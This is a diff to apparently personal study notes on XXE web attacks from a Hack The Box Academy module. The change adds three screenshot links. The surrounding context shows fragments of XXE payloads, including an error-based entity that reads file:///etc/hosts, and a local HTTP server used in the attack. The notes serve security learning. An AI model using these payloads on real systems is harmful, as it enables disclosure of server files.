@@ -55,7 +55,11 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 <email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
 ```
 
+![https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_php_cdata.jpg](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_php_cdata.jpg)
+
 ## Error Based XXE
+
+![https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_cause_error.jpg](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_cause_error.jpg)
 
 ``` xml
 <!ENTITY % file SYSTEM "file:///etc/hosts">
@@ -69,6 +73,8 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
   %error;
 ]>
 ```
+
+![https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_exfil_error_2.jpg](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_exfil_error_2.jpg)
 
 # 
 
